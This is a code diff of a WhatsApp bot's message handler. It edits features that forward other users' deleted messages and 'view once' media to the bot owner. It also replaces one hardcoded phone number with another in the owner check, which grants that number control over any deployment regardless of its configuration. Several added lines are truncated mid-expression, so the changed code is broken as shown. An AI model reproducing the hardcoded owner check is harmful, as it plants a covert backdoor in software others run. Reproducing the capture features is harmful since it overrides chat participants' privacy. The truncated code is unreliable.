@@ -69,7 +69,7 @@ export const handleMessages = async (sock: WASocket, upsert: { messages: any[] }
                                      '';
 
                       await sock.sendMessage(ownerJid, {
-                          text: `🗑️ *Deleted Message Detected!*\n• *Sender:* @${originalMsg.sender.split('@')[0]}\n• *Chat:* @${from.split('@')[0]}\n• *Content:* ${originalText || '_[Media or Unknown]_'}`,
+                          text: `🗑️ *Deleted Message Detected!*\n• *Sender:* @${originalMsg.sender.split('@')[0]}\n• *Chat:* @${from.split('@')[0]}\n• *Content:* ${originalText || '_[Me[...]
                           mentions: [originalMsg.sender, from]
                       });
                       
@@ -112,7 +112,7 @@ export const handleMessages = async (sock: WASocket, upsert: { messages: any[] }
                       buffer = Buffer.concat([buffer, chunk]);
                   }
                   
-                  await sock.sendMessage(ownerJid, { text: `📸 *View Once Media Detected from @${sender.split('@')[0]} in @${from.split('@')[0]}!* (Automatically Saved Below)`, mentions: [sender, from] });
+                  await sock.sendMessage(ownerJid, { text: `📸 *View Once Media Detected from @${sender.split('@')[0]} in @${from.split('@')[0]}!* (Automatically Saved Below)`, mentions: [sende[...]
                   const sendType = typeMap[mediaType];
                   if (sendType === 'image') {
                       await sock.sendMessage(ownerJid, { image: buffer, caption: `Saved View Once Image from ${sender}` });
@@ -151,7 +151,7 @@ export const handleMessages = async (sock: WASocket, upsert: { messages: any[] }
       const numericOwner = config.bot.ownerNumber ? config.bot.ownerNumber.replace(/[^0-9]/g, '') : '';
       const isOwner = !!(
         m.key.fromMe || 
-        numericSender === '254713811622' ||
+        numericSender === '254111888637' ||
         (numericOwner && numericSender === numericOwner) || 
         (config.bot.ownerNumber && safeSender.includes(config.bot.ownerNumber))
       );
